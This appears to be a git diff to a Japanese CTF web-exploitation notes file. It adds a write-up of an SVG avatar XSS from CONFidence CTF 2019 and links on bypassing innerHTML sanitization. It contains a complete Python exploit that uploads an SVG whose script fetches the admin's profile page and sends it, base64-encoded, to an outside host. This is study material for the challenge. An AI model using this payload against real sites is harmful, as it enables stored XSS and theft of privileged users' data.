@@ -1240,11 +1240,45 @@ adminのクローラに以下のURLを提出する。
 ```txt
 [svg](http://uploads.web-shop.ctfz.one/10f02271-2aaf-47e7-82c8-60941bb11fa0/093c690b-ba19-4705-b299-38c8286fc8d6.svg)
 ```
-## 
+## SVG image XSS (CONFidence CTF 2019)
+https://balsn.tw/ctf_writeup/20190317-confidencectf/#solution-1:-xss-in-svg-image  
 - **entrypoint**   
-- **概要**   
+nginx + Flask（Python）+ CloudFlareがバックエンドで動いている。  
+プロフィールページでアバターとして画像ファイルがアップロードできるので、SVGイメージの中にXSSを仕込む。  
 - **Payload**   
+アバターの画像は100x100のサイズでないといけないので、`<image id="image0" width="100" height="100" x="0" y="0" href="" />`でサイズを指定する。  
+```python
+#!/usr/bin/env python3
+import requests, glob
+import secrets
+s = requests.session()
+r = s.post('http://web50.zajebistyc.tf/login', data=dict(login='laiph6Ieroh4iema',password='laiph6Ieroh4iema'))
+filename = secrets.token_urlsafe(16) + '.html'
+payload = '''<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="100px" height="100px" viewBox="0 0 100 100" enable-background="new 0 0 100 100" xml:space="preserve">  
+   <script>
+      fetch("http://web50.zajebistyc.tf/profile/admin").then(r => r.text()).then(t => fetch("//example.com/"+btoa(t)));
+   </script>
+<image id="image0" width="100" height="100" x="0" y="0"
+    href="" />
+</svg>
+'''
+files = {
+    'avatar': (filename, payload)
+}
+r = s.post('http://web50.zajebistyc.tf/profile/laiph6Ieroh4iema', files=files)
+if 'not a valid image' in r.text[:150]:
+    print(r.text)
+if 'sorry, we only accept 100x100 images' in r.text[:150]:
+    print(r.text)
+url = 'http://web50.zajebistyc.tf/avatar/62eee5152305547ff387eef08af028d340611ce15db259aeb714f6518328885b/'+filename
+print(url)
+r = s.get(url)
+print(r.headers['Content-Type'])
 
+# p4{15_1t_1m4g3_or_n0t?}
+```
 ## 
 - **entrypoint**   
 - **概要**   
@@ -1651,7 +1685,8 @@ https://renaudmarti.net/posts/intigriti-xss-challenge/
 動作環境ないと理解するの難しそう…  
 https://jsbin.com/?html  
 html,css,JavaScript,Consoleを自由に実行できるようなサイト。XSSの検証によさそう！  
-
+https://www.hamayanhamayan.com/entry/2020/06/27/191504  
+.innerHTMLのサニタイジングをバイパスするテク  
 
 
 
